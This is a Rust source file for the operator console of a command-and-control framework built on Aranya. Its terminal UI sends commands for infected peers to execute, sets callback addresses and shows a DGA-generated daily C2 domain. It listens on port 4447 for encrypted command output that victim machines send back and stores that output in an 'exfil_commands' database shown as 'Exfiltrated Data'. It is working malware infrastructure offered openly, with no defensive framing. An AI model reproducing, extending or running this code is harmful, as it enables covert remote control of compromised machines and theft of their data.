use c2::*;

use std::{
    fs::{self, OpenOptions},
    io::{Read, Write},
    net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
    path::{Path, PathBuf},
    str::FromStr,
    sync::Arc,
    sync::mpsc,
    thread,
    time::Duration,
};

use aes::Aes256;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
use aranya_crypto::Rng;
use aranya_policy_ifgen::Actionable;
use aranya_policy_vm::{Text, text};
use aranya_runtime::{GraphId, Sink, VmEffect, vm_action};
use base64::{Engine, prelude::BASE64_STANDARD};
use clap::Parser;
use ratatui::{
    DefaultTerminal, Frame,
    crossterm::{
        self,
        event::{Event, KeyCode, KeyEvent, KeyModifiers},
    },
    layout::{Constraint, Layout},
    style::{Color, Style, Stylize},
    text::{Line, Span},
    widgets::{Block, Padding, Paragraph},
};
use rsa::{
    Oaep, RsaPrivateKey, RsaPublicKey,
    pkcs8::EncodePublicKey,
    sha2::{Digest, Sha256},
    traits::PublicKeyParts,
};
use rusqlite::Connection;
use s2n_quic::{Client, client};
use serde::{Deserialize, Serialize};
use tokio::sync::Mutex;
use tui_input::{Input, backend::crossterm::EventHandler};

use crate::{
    c2syncer::{C2Syncer, c2push, c2push_sync, new_quic_client},
    common::{
        Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage, PrivateKeyBundle,
    },
    config::C2ClientState,
    policy::{update_callback_c2, update_rsa_key},
};

struct OperatorSink;

#[derive(Parser)]
struct CommandArguments {
    #[arg(long)]
    new_graph: bool,

    // TODO: Is this even possible ?
    // #[arg(long)]
    // list_commands: bool,
    #[arg(long)]
    start_afc: bool,

    #[arg(long)]
    new_rsa: bool,

    #[arg(long)]
    config_dir: String,

    #[arg(long)]
    command: Option<String>,

    #[arg(long)]
    set_callback: Option<String>,

    #[arg(help = "Peer Addresses e.g. 127.0.0.1:4445")]
    args: Vec<String>,
}

impl Sink<VmEffect> for OperatorSink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, _effect: VmEffect) {
        // NOTE: No operation
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 1024;

fn send_db_update_message(tx: &mpsc::Sender<UIEvent>, db: &Connection) {
    let mut stmt = db.prepare("SELECT source_ip, machine_id, SUM(LENGTH(stdout)), SUM(LENGTH(stderr)), MAX(timestamp) FROM exfil_commands GROUP BY source_ip").unwrap();
    let mappedlines = stmt
        .query_map([], |row| {
            let ip: String = row.get::<_, String>(0).unwrap();
            let machine_id: String = row.get::<_, String>(1).unwrap();
            let stdoutlen: i64 = row.get::<_, i64>(2).unwrap();
            let stderrlen: i64 = row.get::<_, i64>(3).unwrap();
            let lasttime: String = row.get::<_, String>(4).unwrap();
            Ok(format!(
                "{machine_id:32} {ip:15} {stdoutlen:10} {stderrlen:10} {lasttime:10}"
            ))
        })
        .unwrap();

    let mut lines = Vec::new();

    lines.push(format!(
        "{:32} {:15} {:>10} {:>10} {:12}",
        "MACHINE ID", "IP", "STDOUT LEN", "STDERR LEN", "LAST MESSAGE"
    ));

    for line in mappedlines {
        lines.push(line.unwrap());
    }

    tx.send(UIEvent::SqliteUpdated(SqliteUpdateData { lines }));
}

async fn parse_fast_channel_message(
    msg: &FastChannelMessage,
    key: &RsaPrivateKey,
    addr: IpAddr,
    dir: &Path,
    db: Arc<Mutex<Connection>>,
    // DB UI updates
    tx: mpsc::Sender<UIEvent>,
) {
    let Ok(share_decrypted) = key.decrypt(Oaep::new::<Sha256>(), &msg.share) else {
        // println!("Failed to rsa decrypt");
        return;
    };

    let Ok(share) = postcard::from_bytes::<Aes256ShareMessage>(&share_decrypted) else {
        // println!("Failed to postcard msg.share");
        return;
    };

    // println!("{:?}", share.nonce);
    // println!("{:?}", share.key);

    let nonce = Nonce::from_slice(&share.nonce);
    let aes = Aes256Gcm::new(&share.key.into());

    let Ok(plaintext) = aes.decrypt(nonce, msg.command.as_slice()) else {
        // println!("Failed to aes decrypt");
        return;
    };

    let Ok(cmd) = postcard::from_bytes::<CommandExecutionMessage>(&plaintext) else {
        // println!("Failed to postcard plaintext");
        return;
    };

    match cmd {
        CommandExecutionMessage::CommandExecuted { stdout, stderr } => {
            // let dir = dir.join("exfil").join("command");
            // fs::create_dir_all(&dir);
            // let mut file = OpenOptions::new()
            //     .append(true)
            //     .create(true)
            //     .open(dir.join(addr.to_string()))
            //     .expect("Couldn't open cmd file");

            // file.write_all(&stdout)
            //     .expect("Failed to write to the file");
            // file.write_all(&stderr)
            //     .expect("Failed to write to the file");
            let db = db.lock().await;
            db.execute(
                "INSERT INTO exfil_commands (source_ip, machine_id, stdout, stderr) VALUES (?, ?, ?, ?)",
                (addr.to_string(), share.machine_id, stdout, stderr)
            ).unwrap(); // TODO: Remove unwrap??

            send_db_update_message(&tx, &db);
        }
        CommandExecutionMessage::FoldersExfiltrated { folders: _ } => {}
    }
}

async fn afc_listener(
    dir: PathBuf,
    key: RsaPrivateKey,
    db: Arc<Mutex<Connection>>,
    // For notifications to the UI about DB state changes
    tx: mpsc::Sender<UIEvent>,
) {
    // Just to updae the UI lol
    {
        let db = db.lock().await;
        send_db_update_message(&tx, &db);
    }

    let listener = TcpListener::bind("0.0.0.0:4447").unwrap();
    // println!("Listening now");

    let mut buffer = vec![0; MAX_MESSAGE_SIZE];
    for stream in listener.incoming() {
        // println!("Accepitng stream");
        let mut stream = stream.unwrap();
        let addr = stream.peer_addr().unwrap().ip();

        let Ok(n) = stream.read(&mut buffer) else {
            // println!("Failed to read stream");
            continue;
        };

        if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&buffer[..n]) {
            parse_fast_channel_message(&data, &key, addr, &dir, db.clone(), tx.clone()).await;
        } else {
            // println!("Failed to postcard buffer");
        }
    }
}

struct SqliteUpdateData {
    lines: Vec<String>,
}

// For use within the UI rendering code, where either a keypress
//   or an sqlite database update will trigger a re-render
enum UIEvent {
    Key(KeyEvent),
    SqliteUpdated(SqliteUpdateData),
    // No reason specified, just update the UI
    GenericUpdateUI,
    PubKeyUpdated(RsaPublicKey),
    CallbackUpdated(Option<SocketAddr>),
}

struct RatatuiApp {
    cache: C2SettingsCache,
    input: Input,
    cmdoutput: String,
    // C2 RSA public key sha256 & callback from policy
    lastpubkeyhash: Option<String>,
    lastcallback: Option<SocketAddr>,
    // Just lines to appear in the big box, very generic
    bigboxoutputs: Vec<String>,

    // UI Update channel transmitter & receiver
    tx: mpsc::Sender<UIEvent>,
    rx: mpsc::Receiver<UIEvent>,

    // Egress traffic
    quic: Arc<Client>,

    // C2-specific/Aranya-specific fields
    aranya: C2Client,
    sink: OperatorSink,
    clientstate: C2ClientState,
}

impl RatatuiApp {
    fn new(
        cache: C2SettingsCache,
        aranya: C2Client,
        sink: OperatorSink,
        clientstate: C2ClientState,
    ) -> Self {
        let (tx, rx) = mpsc::channel::<UIEvent>();

        let bind = SocketAddr::new(
            IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)),
            // NOTE: Operator does not need the default port as
            //   nobody will be calling back to it...
            4443,
        );

        let quic = Arc::new(new_quic_client(bind));

        Self {
            cache: cache,
            input: Input::default(),
            cmdoutput: String::default(),
            bigboxoutputs: Vec::new(),
            lastpubkeyhash: None,
            lastcallback: None,
            aranya: aranya,
            sink: sink,
            clientstate: clientstate,
            tx,
            rx,
            quic,
        }
    }

    fn render(&self, frame: &mut Frame) {
        // Set up layout of the UI
        let chunks = Layout::vertical([
            Constraint::Length(9),
            Constraint::Fill(1),
            Constraint::Length(16),
        ])
        .split(frame.area());

        // Print out the configuration directory
        let config_dir = match &self.cache.current_config_dir {
            Some(v) => v.to_string(),
            None => "ADD CONFIGURATION DIRECTORY".to_string(),
        };

        let pubkey = match &self.lastpubkeyhash {
            Some(v) => v.to_string(),
            None => "UNSET".to_string(),
        };

        let callback = match &self.lastcallback {
            Some(v) => v.to_string(),
            None => "UNSET".to_string(),
        };

        // General Information
        let paragraph = Paragraph::new(vec![
            Line::from(vec![
                Span::styled("Root directory: ", Style::default().fg(Color::DarkGray)),
                Span::styled(config_dir, Style::default().fg(Color::White)),
            ]),
            Line::from(vec![
                Span::styled("Graph ID: ", Style::default().fg(Color::DarkGray)),
                Span::styled(
                    self.aranya.get_graph().to_string(),
                    Style::default().fg(Color::White),
                ),
            ]),
            Line::from(vec![
                Span::styled("RSA Public Key: ", Style::default().fg(Color::DarkGray)),
                Span::styled(pubkey, Style::default().fg(Color::White)),
            ]),
            Line::from(vec![
                Span::styled(
                    "Current C2 Callback: ",
                    Style::default().fg(Color::DarkGray),
                ),
                Span::styled(callback, Style::default().fg(Color::White)),
            ]),
            Line::from(vec![
                Span::styled(
                    "Today's C2 Domain: ",
                    Style::default().fg(Color::DarkGray),
                ),
                Span::styled(dga::generate_domain_now(config::DOMAIN), Style::default().fg(Color::White)),
            ]),
        ])
        .block(
            Block::bordered()
                .title(format!("General Information"))
                .fg(Color::LightGreen)
                .padding(Padding::new(1, 1, 1, 1)),
        );

        frame.render_widget(paragraph, chunks[0]);

        // Exfiltrated Data
        let mut lines = Vec::new();

        if self.bigboxoutputs.len() > 0 {
            lines.push(Line::from(vec![Span::styled(
                self.bigboxoutputs[0].clone(),
                Style::default().fg(Color::DarkGray),
            )]));

            for out in &self.bigboxoutputs[1..] {
                lines.push(Line::from(vec![Span::styled(
                    out.as_str(),
                    Style::default().fg(Color::White),
                )]));
            }
        }

        let paragraph = Paragraph::new(lines).block(
            Block::bordered()
                .title(format!("Exfiltrated Data"))
                .fg(Color::LightGreen)
                .padding(Padding::new(1, 1, 1, 1)),
        );

        frame.render_widget(paragraph, chunks[1]);

        // Shell
        {
            let block = Block::bordered()
                .title(format!("Interactive Shell"))
                .fg(Color::LightGreen)
                .padding(Padding::new(1, 1, 1, 1));

            let inner = block.inner(chunks[2]);

            let cmdchunks =
                Layout::vertical([Constraint::Fill(1), Constraint::Length(1)]).split(inner);

            frame.render_widget(block, chunks[2]);

            frame.render_widget(
                Paragraph::new(self.cmdoutput.clone()).fg(Color::White),
                cmdchunks[0],
            );

            frame.render_widget(
                Line::from(vec![
                    Span::styled("$ ", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        self.input.clone().to_string(),
                        Style::default().fg(Color::White),
                    ),
                ])
                .fg(Color::White),
                cmdchunks[1],
            );

            frame.set_cursor_position((
                cmdchunks[1].x + self.input.cursor() as u16 + 2,
                cmdchunks[1].y as u16,
            ));
        }
    }

    fn submit(&mut self) {
        let binding = self.input.value_and_reset();
        let cmd: Vec<&str> = binding.split(" ").collect();

        self.cmdoutput = String::default();
        if cmd[0].len() == 0 {
            return;
        }

        match cmd[0] {
            "command" => {
                if cmd.len() < 2 {
                    self.cmdoutput = "Usage: command <COMMAND...>\n".to_string();
                    self.cmdoutput += "Example: command echo hi";
                    return;
                }

                let execcmd = cmd[1..].join(" ");

                let txt = Text::from_str(&execcmd).unwrap();
                let prevhead = self
                    .clientstate
                    .head_address(self.aranya.get_graph())
                    .expect("Couldn't get head of graph");
                self.clientstate.action(
                    self.aranya.get_graph(),
                    &mut self.sink,
                    vm_action!(execute_command(txt)),
                );

                for peer in &self.cache.peers {
                    if let Ok(peer) = peer.parse::<SocketAddr>() {
                        // println!("Syncing with {peer}");
                        c2push_sync(
                            peer,
                            Arc::clone(&self.quic),
                            &mut self.clientstate,
                            self.aranya.get_graph(),
                            None, // *prevhead
                        );
                    }
                }
            }
            "addpeer" => {
                if cmd.len() < 2 {
                    self.cmdoutput = "Usage: addpeer <IP:PORT>\n".to_string();
                    self.cmdoutput += "Example: addpeer 192.168.1.2:4445";
                    return;
                }

                let Ok(peer) = cmd[1].parse::<SocketAddr>() else {
                    self.cmdoutput = "Failed to parse peer IP".to_string();
                    return;
                };

                self.cache.peers.push(peer.to_string());
                self.cache.save_cache();
            }
            "removepeer" => {
                if cmd.len() < 2 {
                    self.cmdoutput = "Usage: removepeer <IP:PORT>\n".to_string();
                    self.cmdoutput += "Example: removepeer 192.168.1.2:4445";
                    return;
                }

                let Ok(peer) = cmd[1].parse::<SocketAddr>() else {
                    self.cmdoutput = "Failed to parse peer IP".to_string();
                    return;
                };

                self.cache.peers.retain(|v| *v != peer.to_string());
                self.cache.save_cache();
            }
            "listpeers" => {
                for peer in &self.cache.peers {
                    self.cmdoutput += &format!("{peer} ").to_string();
                }
            }
            "set" => {
                if cmd.len() < 2 {
                    self.cmdoutput = "Possible values: configdir".to_string();
                    return;
                }

                match cmd[1] {
                    "configdir" => {
                        if cmd.len() < 3 {
                            self.cmdoutput = "Usage: set configdir <DIRECTORY>\n".to_string();
                            self.cmdoutput += "Example: set configdir ~/Desktop/myc2";
                            return;
                        }

                        let dir = cmd[2];

                        self.cache.current_config_dir = Some(dir.to_string());
                        self.cache.save_cache();
                        self.aranya = C2Client::new(dir.into());
                        self.aranya.initialise_config(&mut self.sink);

                        self.tx.send(UIEvent::CallbackUpdated(None));
                        self.tx.send(UIEvent::PubKeyUpdated(
                            self.aranya.load_rsa_key().to_public_key(),
                        ));
                    }
                    // NOTE: No new graph, as config dir change will automatically create one
                    // "newgraph" => {
                    //     let keys = self.aranya.load_keys();
                    //     let graph = match self.aranya.create_graph(&mut self.clientstate, &mut self.sink, &keys) {
                    //         Ok(v) => v,
                    //         Err(_) => return
                    //     };
                    // },
                    "callback" => {
                        if cmd.len() < 3 {
                            self.cmdoutput = "Usage: set callback <IP:PORT>\n".to_string();
                            self.cmdoutput += "Example: set callback 192.168.1.1:4447";
                            return;
                        }

                        // Validate IP
                        let Ok(callback) = cmd[2].parse::<SocketAddr>() else {
                            self.cmdoutput = "Failed to parse callback IP".to_string();
                            return;
                        };

                        let txt = Text::from_str(&cmd[2]).unwrap();
                        update_callback_c2(txt).with_action(|action| {
                            self.clientstate
                                .action(self.aranya.get_graph(), &mut self.sink, action)
                        });

                        self.tx.send(UIEvent::CallbackUpdated(Some(callback)));
                    }
                    _ => {
                        self.cmdoutput = "Possible values: configdir".to_string();
                    }
                }
            }
            _ => {
                self.cmdoutput = "Unknown command. Type \"help\" for help.".to_string();
            }
        }
    }

    fn run(&mut self, terminal: &mut DefaultTerminal) -> std::io::Result<()> {
        let trx = self.tx.clone();
        thread::spawn(move || {
            loop {
                let crosstermevt = crossterm::event::read();
                if let Ok(Event::Key(evt)) = crosstermevt {
                    trx.send(UIEvent::Key(evt));
                } else if let Ok(Event::Resize(_, _)) = crosstermevt {
                    trx.send(UIEvent::GenericUpdateUI);
                }
            }
        });

        tokio::spawn(afc_listener(
            self.aranya.config_dir.clone(),
            self.aranya.load_rsa_key(),
            Arc::clone(&self.aranya.sqlite),
            self.tx.clone(),
        ));

        // Get RSA key and callback from graph
        let Ok(info) = self.aranya.get_latest_information(&mut self.clientstate) else {
            // TODO: Print error??
            return Ok(());
        };

        if let Some(callback) = info.callback {
            self.tx.send(UIEvent::CallbackUpdated(Some(callback)));
        }

        if let Some(key) = info.pubkey {
            self.tx.send(UIEvent::PubKeyUpdated(key));
        }
        // tx.send(UIEvent::Rsa(info.callback));

        loop {
            terminal.draw(|frame| self.render(frame))?;
            match self.rx.recv().unwrap() {
                UIEvent::Key(evt) => match evt.code {
                    KeyCode::Enter => {
                        self.submit();
                    }
                    KeyCode::Char('c') if evt.modifiers == KeyModifiers::CONTROL => {
                        break Ok(());
                    }
                    _ => {
                        self.input.handle_event(&Event::Key(evt));
                    }
                },
                UIEvent::SqliteUpdated(data) => {
                    self.bigboxoutputs = data.lines;
                }
                UIEvent::CallbackUpdated(callback) => {
                    self.lastcallback = callback;
                }
                UIEvent::PubKeyUpdated(pubkey) => {
                    let mut hasher = Sha256::new();
                    hasher.update(pubkey.to_public_key_der().unwrap().as_bytes());

                    self.lastpubkeyhash = Some(format!(
                        "SHA256:{}",
                        BASE64_STANDARD.encode(hasher.finalize())
                    ));
                }
                _ => {}
            }
        }
    }
}

// This struct will store some cache information for the current
//   user so that the program can be stopped and started quickly
//   without having to respecify arguments for interactive mode
#[derive(Serialize, Deserialize, Default)]
pub struct C2SettingsCache {
    current_config_dir: Option<String>,
    // TODO: Should this be on a per-config dir basis?
    peers: Vec<String>,
}

impl C2SettingsCache {
    fn path() -> PathBuf {
        let path = dirs::cache_dir()
            .expect("Could not get cache dir")
            .join("aranyac2");

        fs::create_dir_all(&path);

        return path.join("settings.dat");
    }

    pub fn load_cache() -> Self {
        let path = C2SettingsCache::path();

        let data = fs::read(&path).unwrap_or_default();

        postcard::from_bytes::<C2SettingsCache>(&data).unwrap_or_default()
    }

    pub fn save_cache(&self) {
        let path = C2SettingsCache::path();

        let data =
            postcard::to_allocvec::<C2SettingsCache>(&self).expect("Could not serialise settings");

        fs::write(&path, &data).expect("Could not write cache settings");
    }
}

#[tokio::main]
async fn main() {
    // Enable logging to terminal
    tracing_subscriber::fmt::init();

    // println!("{}", dga::generate_domain_now(config::DOMAIN));
    // return;

    let mut cache = C2SettingsCache::load_cache();

    let dir: PathBuf = cache
        .current_config_dir
        .clone()
        .unwrap_or("/tmp/myc2".into())
        .into();
    cache.current_config_dir = Some(dir.to_string_lossy().to_string());

    // let dir = Path::new(&args.config_dir);

    let mut sink = OperatorSink;
    let mut aranya = C2Client::new(dir.to_path_buf());

    let (mut clientstate, keys) = aranya.initialise_config(&mut sink);

    if true {
        // TODO: TMP:
        // fs::write("src/graph.txt", aranya.get_graph().as_array());

        let mut app = RatatuiApp::new(cache, aranya, sink, clientstate);
        ratatui::run(|terminal| app.run(terminal));
        return;
    }

    // let args = CommandArguments::parse();
    // if args.new_graph {
    //     let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
    //         Ok(v) => v,
    //         Err(_) => return
    //     };

    //     // TODO: Temporary debug code for infected nodes to quickly
    //     //   connect up to the same graph ID
    //     fs::write("src/graph.txt", graph.as_array());
    // }

    // if let Some(command) = args.command {
    //     let txt = Text::from_str(&command).unwrap();
    //     clientstate.action(
    //         aranya.get_graph(),
    //         &mut sink,
    //         vm_action!(execute_command(txt))
    //     );
    // }

    // if args.new_rsa {
    //     aranya.new_rsa_key(&mut clientstate, &mut sink);
    // }

    // if let Some(callback) = args.set_callback {
    //     let txt = Text::from_str(&callback).unwrap();
    //     update_callback_c2(txt).with_action(|action| {
    //         clientstate.action(
    //             aranya.get_graph(),
    //             &mut sink,
    //             action
    //         )
    //     });
    // }

    // if args.start_afc {
    //     // Fake unused
    //     let (tx, _rx) = mpsc::channel::<UIEvent>();

    //     tokio::spawn(afc_listener(
    //         dir.to_path_buf(),
    //         aranya.load_rsa_key(),
    //         Arc::clone(&aranya.sqlite),
    //         tx
    //     ));
    // }

    // let quic = {
    //     let mut syncbind = bind.clone();
    //     syncbind.set_port(4446);
    //     Arc::new(new_quic_client(syncbind))
    // };

    // let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));

    // for ipstr in &args.args {
    //     tokio::time::sleep(Duration::from_millis(1000)).await;
    //     let socket: SocketAddr = ipstr.parse()
    //         .expect("Invalid IP format");

    //     c2push(
    //         socket,
    //         Arc::clone(&quic),
    //         Arc::clone(&syncer),
    //         aranya.get_graph()
    //     ).await;
    // }

    // // TODO: This sleep is very important becasue without it, the
    // //   program will end and the data won't be transferred to
    // //   some of the peers, if any at all.
    // // tokio::time::sleep(Duration::from_millis(1000)).await;

    // if args.start_afc {
    //     tokio::time::sleep(Duration::from_millis(100000000)).await;
    // } else if args.args.len() > 0 {
    //     tokio::time::sleep(Duration::from_millis(2000)).await;
    // }
}
